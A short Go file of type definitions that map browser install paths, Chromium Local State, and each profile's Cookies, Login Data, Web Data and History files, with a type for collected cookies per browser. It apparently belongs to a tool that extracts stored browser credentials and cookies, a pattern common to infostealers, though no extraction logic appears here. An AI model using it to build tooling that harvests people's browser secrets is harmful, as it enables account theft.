package structs

type Browser struct {
	Path        string     `json:"path"`
	LocalState  string     `json:"localstate"`
	ProfilePath string     `json:"profilepath"`
	Chromeium   bool       `json:"chromeium"`
	Profiles    []Profiles `json:"profiles"`
}

type Profiles struct {
	WebData   string `json:"webdata"`
	Cookies   string `json:"cookies"`
	History   string `json:"history"`
	LoginData string `json:"logindata"`
}

type CookiesOutput struct {
	BrowserName string
	Cookies     string
}
